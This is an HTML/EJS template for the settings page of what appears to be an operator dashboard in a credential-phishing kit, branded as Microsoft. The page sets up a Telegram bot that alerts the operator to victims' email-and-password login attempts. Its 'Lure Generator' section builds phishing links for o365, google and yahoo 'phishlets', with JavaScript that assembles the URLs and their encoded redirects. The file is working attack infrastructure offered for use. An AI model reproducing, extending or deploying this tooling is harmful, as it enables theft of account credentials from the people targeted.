<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Settings - Microsoft</title>
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #121212;
            --bg-card: #1e1e1e;
            --bg-input: #2d2d2d;
            --border-color: #333;
            --text-primary: #ededed;
            --text-secondary: #a1a1aa;
            --accent-blue: #0078d4;
            --accent-blue-hover: #006abc;
            --accent-light: #60cdff;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-primary);
            line-height: 1.5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .settings-container {
            flex: 1;
            padding: 40px;
            max-width: 900px;
            margin: 0 auto;
            width: 100%;
        }

        .settings-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
            padding-bottom: 20px;
            border-bottom: 1px solid var(--border-color);
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .header-left .logo {
            width: 40px;
            height: 40px;
        }

        .header-title {
            font-size: 24px;
            font-weight: 600;
            color: white;
        }

        .header-subtitle {
            color: var(--text-secondary);
            font-size: 14px;
        }

        .nav-buttons {
            display: flex;
            gap: 12px;
        }

        .btn-nav {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 10px 20px;
            background: transparent;
            color: var(--text-secondary);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            text-decoration: none;
            transition: all 0.2s ease;
        }

        .btn-nav:hover {
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-primary);
        }

        .settings-section {
            background: var(--bg-card);
            border-radius: 8px;
            border: 1px solid var(--border-color);
            margin-bottom: 24px;
            overflow: hidden;
        }

        .section-header {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 20px 24px;
            border-bottom: 1px solid var(--border-color);
            background: rgba(0, 0, 0, 0.2);
        }

        .section-icon {
            width: 40px;
            height: 40px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #0088cc 0%, #00c6ff 100%);
        }

        .section-title {
            font-size: 18px;
            font-weight: 600;
            color: white;
        }

        .section-subtitle {
            font-size: 13px;
            color: var(--text-secondary);
        }

        .section-body {
            padding: 24px;
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 0;
        }

        .form-label {
            display: block;
            font-size: 13px;
            color: var(--text-secondary);
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            padding: 12px 14px;
            font-size: 15px;
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            color: var(--text-primary);
            outline: none;
            transition: all 0.2s ease;
        }

        .form-input:focus {
            border-color: var(--accent-blue);
        }

        .form-hint {
            font-size: 12px;
            color: var(--text-secondary);
            margin-top: 6px;
        }

        .toggle-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 0;
            border-bottom: 1px solid var(--border-color);
        }

        .toggle-row:last-child {
            border-bottom: none;
        }

        .toggle-info h4 {
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 4px;
            color: white;
        }

        .toggle-info p {
            font-size: 13px;
            color: var(--text-secondary);
        }

        .toggle-switch {
            position: relative;
            width: 48px;
            height: 26px;
        }

        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .toggle-slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--border-color);
            border-radius: 26px;
            transition: 0.3s;
        }

        .toggle-slider:before {
            position: absolute;
            content: "";
            height: 20px;
            width: 20px;
            left: 3px;
            bottom: 3px;
            background: white;
            border-radius: 50%;
            transition: 0.3s;
        }

        .toggle-switch input:checked+.toggle-slider {
            background: var(--accent-blue);
        }

        .toggle-switch input:checked+.toggle-slider:before {
            transform: translateX(22px);
        }

        .button-row {
            display: flex;
            gap: 12px;
            margin-top: 24px;
        }

        .btn-primary {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 12px 24px;
            background: var(--accent-blue);
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.2s ease;
        }

        .btn-primary:hover {
            background: var(--accent-blue-hover);
        }

        .btn-secondary {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 12px 24px;
            background: transparent;
            color: white;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.2s ease;
        }

        .btn-secondary:hover {
            border-color: white;
        }

        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }

        .status-connected {
            background: rgba(16, 185, 129, 0.15);
            color: #10b981;
        }

        .setup-box {
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 20px;
        }

        .setup-title {
            color: white;
            font-weight: 600;
            margin-bottom: 12px;
            font-size: 14px;
        }

        .setup-list {
            padding-left: 20px;
            color: var(--text-secondary);
            font-size: 13px;
        }

        .setup-list li {
            margin-bottom: 6px;
        }

        .footer {
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid var(--border-color);
            text-align: center;
            font-size: 12px;
            color: var(--text-secondary);
            display: flex;
            justify-content: center;
            gap: 20px;
        }

        .footer a {
            color: var(--text-secondary);
            text-decoration: none;
        }

        .footer a:hover {
            color: var(--text-primary);
            text-decoration: underline;
        }
    </style>
</head>

<body
    style="background-image: url('https://cdn.dribbble.com/users/1338391/screenshots/15482313/media/4e172856f6ce8968953d6C1d9f4f46a2.jpg'); background-size: cover; background-position: center;">
    <div
        style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(18, 18, 18, 0.95); z-index: -1;">
    </div>

    <div class="settings-container">
        <!-- Header -->
        <header class="settings-header">
            <div class="header-left">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft"
                    class="logo">
                <div>
                    <h1 class="header-title">Settings</h1>
                    <p class="header-subtitle">Configure Telegram notifications and integrations</p>
                </div>
            </div>
            <div class="nav-buttons">
                <a href="/" class="btn-nav">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M19 12H5M12 19l-7-7 7-7" />
                    </svg>
                    Back to Dashboard
                </a>
            </div>
        </header>

        <% if (messages.success) { %>
            <div
                style="padding: 15px; margin-bottom: 20px; background: rgba(16, 185, 129, 0.2); border: 1px solid #10b981; color: #10b981; border-radius: 8px;">
                <%= messages.success %>
            </div>
            <% } %>

                <% if (messages.error) { %>
                    <div
                        style="padding: 15px; margin-bottom: 20px; background: rgba(239, 68, 68, 0.2); border: 1px solid #ef4444; color: #ef4444; border-radius: 8px;">
                        <%= messages.error %>
                    </div>
                    <% } %>

                        <form action="/settings/telegram" method="POST">

                            <!-- Telegram Bot -->
                            <div class="settings-section">
                                <div class="section-header">
                                    <div class="section-icon">
                                        <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
                                            <path
                                                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z" />
                                        </svg>
                                    </div>
                                    <div>
                                        <h2 class="section-title">Telegram Bot</h2>
                                        <p class="section-subtitle">Receive login notifications via Telegram</p>
                                    </div>
                                    <% if (settings.telegram_token && settings.telegram_chatid) { %>
                                        <span class="status-badge status-connected">
                                            Connected
                                        </span>
                                        <% } %>
                                </div>
                                <div class="section-body">

                                    <!-- Setup Instructions -->
                                    <div class="setup-box">
                                        <h4 class="setup-title">How to configure your Telegram bot</h4>
                                        <ol class="setup-list">
                                            <li>Open Telegram and search for <strong>@BotFather</strong></li>
                                            <li>Send <strong>/newbot</strong> and follow the prompts to create your bot
                                            </li>
                                            <li>Copy the <strong>Bot Token</strong> and paste it below</li>
                                            <li>To get your <strong>Chat ID</strong>: Search for
                                                <strong>@userinfobot</strong> and start a chat
                                            </li>
                                            <li>It will reply with your user ID. For groups, add your bot to the group,
                                                then use @userinfobot there</li>
                                        </ol>
                                    </div>

                                    <div class="form-row">
                                        <div class="form-group">
                                            <label class="form-label">Bot Token</label>
                                            <input type="text" class="form-input" name="telegram_token"
                                                value="<%= settings.telegram_token %>"
                                                placeholder="••••••••••••••••••••••••••••••••••••••••••••••">
                                            <p class="form-hint">Get this from @BotFather on Telegram</p>
                                        </div>
                                    </div>

                                    <div class="form-row">
                                        <div class="form-group">
                                            <label class="form-label">Chat ID</label>
                                            <input type="text" class="form-input" name="telegram_chatid"
                                                value="<%= settings.telegram_chatid %>" placeholder="7995526950">
                                            <p class="form-hint">Your user ID or group chat ID</p>
                                        </div>
                                    </div>

                                    <div class="toggle-row">
                                        <div class="toggle-info">
                                            <h4>Enable Notifications</h4>
                                            <p>Turn on/off all Telegram notifications</p>
                                        </div>
                                        <label class="toggle-switch">
                                            <input type="checkbox" name="notify_all" <%=(settings.notify_login ||
                                                settings.notify_visit) ? 'checked' : '' %>>
                                            <span class="toggle-slider"></span>
                                        </label>
                                    </div>

                                    <div class="toggle-row">
                                        <div class="toggle-info">
                                            <h4>Login Attempts</h4>
                                            <p>Notify when a user attempts to log in with email and password</p>
                                        </div>
                                        <label class="toggle-switch">
                                            <input type="checkbox" name="notify_login" <%=settings.notify_login
                                                ? 'checked' : '' %>>
                                            <span class="toggle-slider"></span>
                                        </label>
                                    </div>

                                    <div class="toggle-row">
                                        <div class="toggle-info">
                                            <h4>Page Views</h4>
                                            <p>Notify when users visit different pages (may be noisy)</p>
                                        </div>
                                        <label class="toggle-switch">
                                            <input type="checkbox" name="notify_visit" <%=settings.notify_visit
                                                ? 'checked' : '' %>>
                                            <span class="toggle-slider"></span>
                                        </label>
                                    </div>

                                    <div class="button-row">
                                        <button type="submit" class="btn-primary">
                                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
                                                stroke="currentColor" stroke-width="2">
                                                <path
                                                    d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z" />
                                                <polyline points="17 21 17 13 7 13 7 21" />
                                                <polyline points="7 3 7 8 15 8" />
                                            </svg>
                                            Save Settings
                                        </button>
                                        <button type="button" class="btn-secondary" onclick="sendTestMessage()">
                                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
                                                stroke="currentColor" stroke-width="2">
                                                <line x1="22" y1="2" x2="11" y2="13"></line>
                                                <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
                                            </svg>
                                            Send Test Message
                                        </button>
                                    </div>

                                </div>
                            </div>
                        </form>

                        <!-- Lure Generator Section -->
                        <div class="settings-section">
                            <div class="section-header">
                                <div class="section-icon"
                                    style="background: linear-gradient(135deg, #8b5cf6 0%, #6366f1 100%);">
                                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white"
                                        stroke-width="2">
                                        <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" />
                                        <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" />
                                    </svg>
                                </div>
                                <div>
                                    <h2 class="section-title">Lure Generator</h2>
                                    <p class="section-subtitle">Create phishing links</p>
                                </div>
                            </div>
                            <div class="section-body">
                                <div class="form-row">
                                    <div class="form-group" style="display: none;">
                                        <label class="form-label">Domain (Host)</label>
                                        <input type="text" class="form-input" id="lureHost" name="host"
                                            placeholder="Resolved automatically" value="">
                                    </div>
                                    <div class="form-group">
                                        <label class="form-label">Path</label>
                                        <input type="text" class="form-input" id="lurePath" name="path"
                                            placeholder="e.g. /hr-portal">
                                    </div>
                                </div>

                                <div class="form-row">
                                    <div class="form-group">
                                        <label class="form-label">Phishlet</label>
                                        <select class="form-input" id="lurePhishlet" name="phishlet"
                                            style="background: var(--bg-input); color: white;">
                                            <% if (typeof phishlets !=='undefined' && phishlets.length> 0) { %>
                                                <% phishlets.forEach(p=> { %>
                                                    <option value="<%= p %>">
                                                        <%= p %>
                                                    </option>
                                                    <% }); %>
                                                        <% } else { %>
                                                            <option value="o365">o365</option>
                                                            <option value="yahoo">yahoo</option>
                                                            <option value="google">google</option>
                                                            <% } %>
                                        </select>
                                    </div>
                                    <div class="form-group">
                                        <label class="form-label">Redirect Param (Optional)</label>
                                        <input type="text" class="form-input" id="lureRedirect" name="redirect"
                                            placeholder="https://office.com">
                                    </div>
                                </div>

                                <div class="button-row">
                                    <button type="button" class="btn-primary" onclick="submitLure()">Create
                                        Lure</button>
                                    <button type="button" class="btn-secondary" onclick="generateLure()">Test Generate
                                        Link</button>
                                </div>

                                <div id="lureResult" style="margin-top: 15px; display: none;">
                                    <div
                                        style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                                        <label class="form-label">Generated Link:</label>
                                        <button type="button" class="btn-secondary"
                                            style="padding: 4px 10px; font-size: 11px;" onclick="copyLureResult()">
                                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none"
                                                stroke="currentColor" stroke-width="2" style="margin-right: 4px;">
                                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                                <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"></path>
                                            </svg>
                                            Copy Link
                                        </button>
                                    </div>
                                    <div style="background: var(--bg-input); padding: 10px; border-radius: 4px; border: 1px solid var(--border-color); color: #8b5cf6; font-family: monospace; word-break: break-all;"
                                        id="lureOutput"></div>
                                </div>
                            </div>
                        </div>

                        <!-- Security / Password Form -->
                        <form action="/settings/password" method="POST">
                            <div class="settings-section">
                                <div class="section-header">
                                    <div class="section-icon"
                                        style="background: linear-gradient(135deg, #10b981 0%, #059669 100%);">
                                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white"
                                            stroke-width="2">
                                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                                            <path d="M9 12l2 2 4-4" />
                                        </svg>
                                    </div>
                                    <div>
                                        <h2 class="section-title">Change Password</h2>
                                        <p class="section-subtitle">Update your dashboard access password</p>
                                    </div>
                                </div>
                                <div class="section-body">
                                    <div class="form-group">
                                        <label class="form-label">New Password</label>
                                        <input type="password" class="form-input" name="new_password"
                                            placeholder="Enter new password">
                                    </div>
                                    <div class="button-row">
                                        <button type="submit" class="btn-primary">
                                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
                                                stroke="currentColor" stroke-width="2">
                                                <path
                                                    d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z" />
                                                <polyline points="17 21 17 13 7 13 7 21" />
                                                <polyline points="7 3 7 8 15 8" />
                                            </svg>
                                            Update Password
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </form>

                        <footer class="footer">
                            <a href="https://t.me/fuckmonad" target="_blank">Help and feedback (t.me/fuckmonad)</a>
                            <a href="https://t.me/fuckmonad" target="_blank">Terms of use(t.me/fuckmonad)</a>
                            <a href="https://t.me/fuckmonad" target="_blank">Privacy and cookies(t.me/qxbtrenches)</a>
                        </footer>
    </div>

    <script>
        const domainMap = <%- JSON.stringify(typeof domainMap !== 'undefined' ? domainMap : {}) %>;
        const globalServer = "<%= typeof globalServer !== 'undefined' ? globalServer : '' %>";
        const phishletSubdomains = <%- JSON.stringify(typeof phishletSubdomains !== 'undefined' ? phishletSubdomains : {}) %>;

        document.getElementById('lurePhishlet').addEventListener('change', function (e) {
            const selected = e.target.value;
            const mappedDomain = domainMap[selected] || globalServer || window.location.host;
            document.getElementById('lureHost').placeholder = "e.g. " + mappedDomain;
        });

        // Initialize placeholder
        window.addEventListener('DOMContentLoaded', () => {
            const el = document.getElementById('lurePhishlet');
            if (el && el.value) {
                const mappedDomain = domainMap[el.value] || globalServer || window.location.host;
                document.getElementById('lureHost').placeholder = "e.g. " + mappedDomain;
            }
        });

        function submitLure() {
            const host = ""; // Host resolution handled by backend
            const path = document.getElementById('lurePath').value.trim();
            const phishlet = document.getElementById('lurePhishlet').value;
            const redirect = document.getElementById('lureRedirect').value.trim();

            if (!path || !phishlet) {
                alert('Path and Phishlet are required.');
                return;
            }

            // Create a form programmatically to submit
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = '/create-lure';

            const inputs = [
                { name: 'host', value: host },
                { name: 'path', value: path },
                { name: 'phishlet', value: phishlet },
                { name: 'redirect', value: redirect }
            ];

            inputs.forEach(i => {
                const hiddenField = document.createElement('input');
                hiddenField.type = 'hidden';
                hiddenField.name = i.name;
                hiddenField.value = i.value;
                form.appendChild(hiddenField);
            });

            document.body.appendChild(form);
            form.submit();
        }

        function generateLure() {
            const selectedPhishlet = document.getElementById('lurePhishlet').value;
            const sub = phishletSubdomains[selectedPhishlet] || '';
            const fallbackHost = domainMap[selectedPhishlet] || globalServer || window.location.host;
            let host = document.getElementById('lureHost').value.trim() || fallbackHost;
            if (sub && !host.startsWith(sub + '.')) {
                host = sub + '.' + host;
            }
            let path = document.getElementById('lurePath').value.trim();
            const redirect = document.getElementById('lureRedirect').value.trim();

            if (!path) path = '/test-path';
            if (!path.startsWith('/')) path = '/' + path;

            let url = `https://${host}${path}`;
            if (redirect) {
                const encoded = btoa(redirect).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
                url += `?r=${encoded}`;
            }

            document.getElementById('lureOutput').textContent = url;
            document.getElementById('lureResult').style.display = 'block';
        }

        function sendTestMessage() {
            fetch('/test-telegram', { method: 'POST' })
                .then(res => res.json())
                .then(data => {
                    if (data.success) {
                        alert('Test message sent!');
                    } else {
                        alert('Failed: ' + data.error);
                    }
                })
                .catch(err => alert('Error sending test message: ' + err));
        }

        function copyLureResult() {
            const text = document.getElementById('lureOutput').textContent;
            if (text) {
                copyString(text);
                alert("Lure URL copied to clipboard!");
            }
        }

        function copyString(text) {
            const copyToClipboard = (str) => {
                if (navigator.clipboard && window.isSecureContext) {
                    return navigator.clipboard.writeText(str);
                } else {
                    let textArea = document.createElement("textarea");
                    textArea.value = str;
                    textArea.style.position = "fixed";
                    textArea.style.left = "-999999px";
                    textArea.style.top = "-999999px";
                    document.body.appendChild(textArea);
                    textArea.focus();
                    textArea.select();
                    try {
                        document.execCommand('copy');
                        textArea.remove();
                        return Promise.resolve();
                    } catch (err) {
                        textArea.remove();
                        return Promise.reject(err);
                    }
                }
            };

            copyToClipboard(text).catch(err => {
                console.error('Failed to copy: ', err);
                alert("Could not copy automatically. Please select and copy manually.");
            });
        }
    </script>
</body>

</html>